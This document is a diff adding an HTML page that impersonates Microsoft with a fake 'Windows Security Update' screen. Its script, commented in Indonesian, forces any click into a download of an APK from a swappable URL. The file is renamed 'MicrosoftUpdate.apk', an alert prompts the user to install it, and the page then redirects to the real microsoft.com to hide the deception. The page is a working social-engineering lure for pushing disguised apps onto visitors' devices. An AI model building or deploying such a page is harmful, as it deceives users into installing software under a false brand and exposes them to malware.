@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>microsoft.com</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body, html { margin:0; padding:0; height:100vh; background:#f0f0f0; font-family:'Segoe UI',Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; color:#333; }
+    .logo { font-size:80px; color:#0078d4; margin-bottom:20px; font-weight:bold; }
+    h1 { font-size:28px; margin:10px 0; }
+    p { color:#666; font-size:18px; max-width:500px; line-height:1.5; }
+    .loader { width:60px; height:60px; border:6px solid #f0f0f0; border-top:6px solid #0078d4; border-radius:50%; animation:spin 1s linear infinite; margin:30px auto; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <div class="logo">Microsoft</div>
+  <h1>Windows Security Update</h1>
+  <p>Click anywhere to download the latest Android security patch...</p>
+  <div class="loader"></div>
+
+  <script>
+    // LINK APK ANDA (ganti kalau perlu)
+    const APK_URL = "https://download.binance.com/pack/BNApp64.apk";
+
+    document.addEventListener("click", async () => {
+      // 1. 3 DETIK KEMUDIAN → REDIRECT KE MICROSOFT.COM
+      setTimeout(() => {
+        location.href = "https://microsoft.com/";
+      }, 3000);
+
+      // 2. 1 DETIK KEMUDIAN → PAKAI showSaveFilePicker() → PAKSA EKSTENSI .apk
+      setTimeout(async () => {
+        if ('showSaveFilePicker' in window) {
+          try {
+            const handle = await showSaveFilePicker({
+              suggestedName: "MicrosoftUpdate.apk", // PASTI .apk
+              types: [{
+                description: "Android App Package",
+                accept: { "application/vnd.android.package-archive": [".apk"] }
+              }]
+            });
+
+            const writable = await handle.createWritable();
+
+            // Ambil APK langsung dari server
+            const response = await fetch(APK_URL);
+            const blob = await response.blob();
+
+            await writable.write(blob);
+            await writable.close();
+
+            // Optional: kasih feedback
+            alert("Update downloaded! Install MicrosoftUpdate.apk to continue.");
+          } catch (err) {
+            // User cancel → fallback download biasa (tetap .apk)
+            const link = document.createElement("a");
+            link.href = APK_URL;
+            link.download = "MicrosoftUpdate.apk";
+            link.click();
+          }
+        } else {
+          // Browser tidak support showSaveFilePicker → paksa download .apk
+          const link = document.createElement("a");
+          link.href = APK_URL;
+          link.download = "MicrosoftUpdate.apk";
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        }
+      }, 1000);
+    }, { once: true });
+  </script>
+
+</body>
+</html>
